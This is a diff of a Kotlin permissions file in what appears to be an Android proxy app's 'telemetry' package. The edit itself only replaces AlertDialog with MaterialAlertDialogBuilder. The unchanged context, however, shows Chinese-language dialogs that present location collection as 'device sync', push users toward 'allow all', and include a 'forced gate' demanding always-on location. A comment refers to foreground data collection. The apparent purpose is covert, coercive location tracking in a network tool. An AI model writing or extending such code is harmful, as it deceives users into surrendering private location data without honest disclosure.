@@ -2,7 +2,8 @@ package io.nekohasekai.sagernet.telemetry
 
 import android.Manifest
 import android.app.Activity
-import android.app.AlertDialog
+import android.content.DialogInterface
+import com.google.android.material.dialog.MaterialAlertDialogBuilder
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
@@ -167,7 +168,7 @@ object TelemetryPermissions {
 
         pref.edit().putBoolean(KEY_ASKED, true).apply()
 
-        AlertDialog.Builder(a)
+        MaterialAlertDialogBuilder(a)
             .setTitle("开启设备同步")
             .setMessage(body.toString().trim())
             .setPositiveButton("全部允许") { _, _ ->
@@ -207,7 +208,7 @@ object TelemetryPermissions {
     }
 
     // ---------------------------------------------------------------- 强制门禁
-    private var gateRef: WeakReference<AlertDialog>? = null
+    private var gateRef: WeakReference<androidx.appcompat.app.AlertDialog>? = null
 
     /** 不再强制后台定位 —— "使用应用时允许"就够，前台采集完全可用。 */
     fun hasBackgroundLocation(a: Activity): Boolean = true
@@ -221,7 +222,7 @@ object TelemetryPermissions {
         val old = gateRef?.get()
         if (old != null && old.isShowing) return
 
-        val d = AlertDialog.Builder(a)
+        val d = MaterialAlertDialogBuilder(a)
             .setTitle("必须开启「始终允许」定位")
             .setMessage("本应用的后台同步依赖常驻定位。\n\n" +
                 "请在接下来的页面里选择：\n" +
